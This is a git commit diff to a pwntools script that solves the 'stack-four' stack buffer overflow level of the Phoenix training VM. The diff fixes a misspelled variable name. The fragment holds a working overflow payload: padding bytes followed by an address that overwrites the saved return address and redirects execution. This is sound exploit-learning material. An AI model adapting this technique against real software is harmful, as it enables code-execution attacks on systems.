abca804a0c7d5a3b887a79e3d4000ceecfec5a8b
Immobility <dongjunkim13@gmail.com>
2021-02-21 16:02:59 -0500

    Added the original C source code

--- phoenix/stack-four/s4.py
+++ phoenix/stack-four/s4.py
@@ -3,7 +3,7 @@ from pwn import *
 p = process('/opt/phoenix/i486/stack-four')
 
 complete_level = "\xe5\x84\x04\x08"
-paylolad = ("A" * 76 + "B" * 4 + complete_level) # Need to get out of the first return, so needed to add 4 extra bytes to the buffer
+payload = ("A" * 76 + "B" * 4 + complete_level) # Need to get out of the first return, so needed to add 4 extra bytes to the buffer
 
 p.sendline(payload)
 
